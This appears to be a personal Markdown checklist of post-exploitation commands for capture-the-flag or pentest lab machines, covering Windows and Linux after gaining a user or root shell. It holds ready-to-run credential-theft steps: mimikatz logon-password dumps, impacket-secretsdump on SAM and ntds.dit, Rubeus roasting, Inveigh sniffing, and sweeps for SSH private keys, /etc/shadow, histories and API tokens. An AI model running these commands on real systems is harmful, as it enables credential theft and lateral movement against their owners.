#  🚨⚠️🚨 DO ALL OF THESE EVERY TIME I GET A NEW USER 🚨⚠️🚨


# Get the flag on Windows

```
whoami; hostname; ipconfig; type C:\localtion\of\The\flag.txt
```


**Sniff For Creds whilst we look around**
```
.\Inveigh.exe
```

## Check all uses Console History

- [ ] `C:>` List out all the files
```
for /f "delims=" %A in ('dir /s /b /a:-d C:\ConsoleHost_history.txt 2^>nul') do @echo %A
```

- [ ] `P:>` Find the files and print the content
```
Get-ChildItem -Path C:\Users\ -Recurse -Force -Filter "ConsoleHost_history.txt" -ErrorAction SilentlyContinue | ForEach-Object {
    Write-Output "`n--- $($_.FullName) ---"
    Get-Content $_.FullName
}
```


**Where is the system and SAM ( ?? ntds.dit ??)**

```
dir C:\Windows\System32\config\SAM
```

```
dir C:\Windows\System32\config\SYSTEM
```

```
dir C:\Windows\ntds\ntds.dit
```

**Local Secrets Dump**
```
impacket-secretsdump -user-status -history -pwd-last-set -sam SAM -system SYSTEM LOCAL | tee SecretsDumped_ntds.txt
```

```
impacket-secretsdump -user-status -history -pwd-last-set -ntds ntds.dit -system SYSTEM LOCAL| tee SecretsDumped_SAM.txt
```

#### Key Mat
**Key store files**

```
for /r "C:\" %F in (*.kdbx) do @echo %~fF
```

**Database files**
```
for /r "C:\" %F in (*.sql) do @echo %~fF
```


## AS-REP ROast

```
./Rubeus.exe asreproast /nowrap /format:hashcat
```

## Kernberoast

```
./Rubeus.exe kerberoast /outfile:hashes.kerb
```


## MimiDump
```
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit" > MimiDump.txt
```

Get all the hashes form the windows created Mimimdump file
```
iconv -f UTF-16LE -t UTF-8 MimiDump.txt 2>/dev/null \
| perl -ne 'while(/(?<![0-9A-Fa-f])([0-9A-Fa-f]{32})(?![0-9A-Fa-f])/g){print lc("$1\n")}' \
| sort -u
```
...and If the file was created in Linux
```
grep -Eo '\b[0-9A-Fa-f]{32}\b' MimiTest.txt | tr 'A-F' 'a-f' | sort -u
```


## git repos3

- [ ] `C:>` Search recursive for Gitrepos
```
for /d /r C:\ %A in (.git) do @if exist "%A\config" @echo %A
```


- [ ] `P:>` Search recursive for Gitrepos with size
```
Get-ChildItem -Path C:\ -Recurse -Directory -Force -ErrorAction SilentlyContinue |
Where-Object { Test-Path "$($_.FullName)\.git\config" } |
ForEach-Object {
    $repo = "$($_.FullName)\.git"
    $size = (Get-ChildItem -Path $repo -Recurse -Force -ErrorAction SilentlyContinue | Measure-Object -Property Length -Sum).Sum
    Write-Output "$repo ($size bytes)"
}
```

```
git log
```

```
git show
```

# Get the flags

```
dir C:\user.txt /s /p /a
```

```
Get-ChildItem -Path C:\ -Filter user.txt -Recurse -Force -ErrorAction SilentlyContinue | Format-List
```

what about ....
```
ntds.dit
```


========


# 🚨⚠️🚨 DO ALL OF THESE EVERY TIME I GET ROOT (LINUX) 🚨⚠️🚨

---

# Get the flag on Linux

```
whoami; hostname; ip a; cat /path/to/flag.txt
```


## 🔎 Network & Pivot Awareness (FIRST)

### Interfaces / Routes / DNS

```
ip a  
ip r  
cat /etc/resolv.conf
```

### Listening Services
```
ss -tulpn
```
### Hosts + Identity
```
cat /etc/hosts  
cat /etc/hostname
```
---

## 🔑 Loot All SSH Material (MOST IMPORTANT)

### Root SSH
```
ls -la /root/.ssh/  
cat /root/.ssh/id_rsa  
cat /root/.ssh/authorized_keys  
cat /root/.ssh/known_hosts
```
### All Users SSH
```
for u in /home/*; do echo "==== $u ===="; ls -la $u/.ssh 2>/dev/null; done
```
### Find Private Keys Anywhere
```
grep -RIl "BEGIN RSA PRIVATE KEY\|BEGIN OPENSSH PRIVATE KEY" / 2>/dev/null
```
---

## 🧠 Shell History (Credential Gold)
```
cat /root/.bash_history  
cat /root/.zsh_history
```

```
for u in /home/*; do cat $u/.bash_history 2>/dev/null; done
```
---

## 🔐 Shadow / Password Reuse
```
cat /etc/passwd  
cat /etc/shadow
```
Save for cracking:
```
unshadow passwd shadow > combined.txt
```
---

## 🗂️ Git Repositories (Huge CTF Win)

### Find .git directories
```
find / -type d -name ".git" 2>/dev/null
```
### Dump repo history
```
git log  
git show  
git diff
```
### Search for secrets in repos
```
git grep -i "password\|secret\|token\|api"
```
---

## 🗄️ Web Roots & App Secrets
```
ls -la /var/www/  
ls -la /opt/  
ls -la /srv/
```
Search for secrets:
```
grep -RIsn --exclude-dir={proc,sys,dev,run} -E "pass(word)?|secret|token|api[_-]?key" /var/www /opt /home /root 2>/dev/null
```
Look for:

- `.env`
- `config.php`
- `settings.py`
- `database.yml`
- `appsettings.json`
- `*.bak`
- `*.old`
- `*.zip`
- `*.tar.gz`

---

## 🗓️ Cron & Timers
```
cat /etc/crontab  
ls -la /etc/cron*
```

```
systemctl list-timers
```

Check what scripts they execute.

---

## 🐳 Docker / Containers

groups

If in docker group:

```
docker ps -a  
docker images
```
---

## 📦 Backups & Interesting Dirs

```
ls -la /var/backups/  
ls -la /backup/  
ls -la /backups/  
ls -la /tmp/  
ls -la /root/
```
---

## 🗃️ Logs (Cred Leakage)
```
ls -la /var/log/  
cat /var/log/auth.log  
cat /var/log/secure  
cat /var/log/syslog
```
Web logs:
```
ls -la /var/log/nginx/  
ls -la /var/log/apache2/
```
---

## 🧬 Database Creds
```
cat /etc/mysql/my.cnf  
cat /var/www/*/config* 2>/dev/null
```
---

## ☁️ Cloud / Kube Loot
```
ls -la ~/.aws/  
ls -la ~/.config/  
ls -la ~/.kube/
```
---

## 🏴‍☠️ Find All Private Keys Fast
```
find / -type f \( -name "*.pem" -o -name "*.key" -o -name "*.pfx" -o -name "id_rsa" \) 2>/dev/null
```
---

## 🔥 Quick Secret Sweep (Fast Win Command)
```
grep -RIsn --exclude-dir={proc,sys,dev,run} -E "password|passwd|secret|token|apikey|BEGIN RSA PRIVATE KEY" / 2>/dev/null
```
---

## 🎯 Flags (Don’t Forget)
```
find / -name "local.txt" 2>/dev/null  
find / -name "user.txt" 2>/dev/null  
find / -name "root.txt" 2>/dev/null
```
---

# 🧠 The Big Three After Root

If you’re tired and want max ROI:

1. Steal **all SSH keys**
2. Check **git repos**
3. Search for **.env / config / backup files**

Those three alone solve most “next box” pivots.
